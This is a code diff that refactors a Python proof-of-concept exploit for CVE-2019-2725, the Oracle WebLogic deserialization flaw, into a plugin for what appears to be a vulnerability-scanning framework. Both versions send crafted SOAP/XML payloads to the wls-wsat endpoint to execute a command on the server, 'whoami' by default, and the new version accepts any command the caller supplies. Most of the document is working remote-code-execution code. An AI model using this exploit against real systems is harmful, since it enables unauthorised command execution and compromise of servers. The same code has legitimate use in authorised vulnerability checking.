@@ -1,31 +1,25 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
-'''
- ____       _     _     _ _   __  __           _
-|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
-| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
-|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
-|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
+# CVE-2019-2725
 
-'''
-import logging
 import sys
+import re
+from urllib.parse import urljoin
+
 import requests
 
-logging.basicConfig(filename='Weblogic.log',
-                    format='%(asctime)s %(message)s',
-                    filemode="w", level=logging.INFO)
+from poc import universe, Star, target_type
+from utils import http
 
-VUL=['CVE-2019-2725']
 
-def weblogic_10_3_6(ip):
-	headers = {
-    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
-    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
-    "Content-Type":"text/xml",
-    "cmd":"%s"%("whoami")
+def weblogic_10_3_6(target, cmd='whoami'):
+    headers = {
+        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
+        'User-Agent': 'TestUA/1.0',
+        "Content-Type": "text/xml",
+        "cmd": "%s" % cmd
     }
-	body = """<?xml version="1.0" encoding="utf-8" ?>
+    body = '''<?xml version="1.0" encoding="utf-8" ?>
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
     xmlns:wsa="http://www.w3.org/2005/08/addressing"
     xmlns:asy="http://www.bea.com/async/AsyncResponseService">
@@ -36,18 +30,19 @@ def weblogic_10_3_6(ip):
     </void></class>
      </work:WorkContext>
      </soapenv:Header>
-     <soapenv:Body></soapenv:Body></soapenv:Envelope>"""
-	url="%s/wls-wsat/CoordinatorPortType"%(ip)
-	rsp = requests.post(url, data=body, verify=False, headers=headers)
-	return rsp.status_code,rsp.text
+     <soapenv:Body></soapenv:Body></soapenv:Envelope>'''
+    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, verify=False,
+                      headers=headers)
+    return resp
 
-def weblogic_12_1_3(ip):
-	headers = {
-    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
-    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
-    "Content-Type":"text/xml"
-}
-	body='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+
+def weblogic_12_1_3(target, cmd='whoami'):
+    headers = {
+        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
+        'User-Agent': 'TestUA/1.0',
+        "Content-Type": "text/xml"
+    }
+    body = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
     <java>
     <class><string>org.slf4j.ext.EventData</string>
     <void>
@@ -68,7 +63,7 @@ def weblogic_12_1_3(ip):
                         </void>
                     </void>
                 </void>
-    
+
                 <void class="java.lang.Thread" method="currentThread">
                     <void method="getCurrentWork" id="current_work">
                         <void method="getClass">
@@ -100,30 +95,24 @@ def weblogic_12_1_3(ip):
     </java>
     </work:WorkContext>
     </soapenv:Header>
-    <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''%("whoami")
-	url="%s/wls-wsat/CoordinatorPortType"%(ip)
-	rsp = requests.post(url, data=body, verify=False, headers=headers)
-	return rsp.status_code,rsp.text
-
-def run(dip,dport,index):
-    ip = "http://{}:{}".format(dip, dport)
-    if weblogic_10_3_6(ip)[0]==200:
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:{}'.format(weblogic_10_3_6(ip)[1].replace('whoami : \r\n','')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(weblogic_10_3_6(ip)[1].replace('whoami : \r\n','')))
-    elif weblogic_12_1_3(ip)[0]==200:
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:{}'.format(weblogic_12_1_3(ip)[1].replace('whoami : \r\n', '')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(weblogic_12_1_3(ip)[1].replace('whoami : \r\n', '')))
-    else:
-        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
-        print('[-]Target weblogic not detected {}'.format(VUL[index]))
+    <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''' % cmd
+    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, verify=False,
+                      headers=headers)
+    return resp
 
 
+@universe.groups()
+class CVE_2019_2725(Star):
+    info = {
+        'NAME': '',
+        'CVE': 'CVE-2019-2725',
+        'TAG': []
+    }
+    type = target_type.VULNERABILITY
 
-if __name__ == '__main__':
-    dip = sys.argv[1]
-    dport = int(sys.argv[2])
-    run(dip,dport,0)
+    def light_up(self, dip, dport, *args, **kwargs) -> (bool, dict):
+        resp = weblogic_10_3_6('http://{}:{}'.format(dip, dport))
+        if resp and resp.status_code == 200:
+            return True, {'msg': 'finish.'}
+        resp = weblogic_12_1_3('http://{}:{}'.format(dip, dport))
+        return resp and resp.status_code == 200, {'msg': 'finish.'}
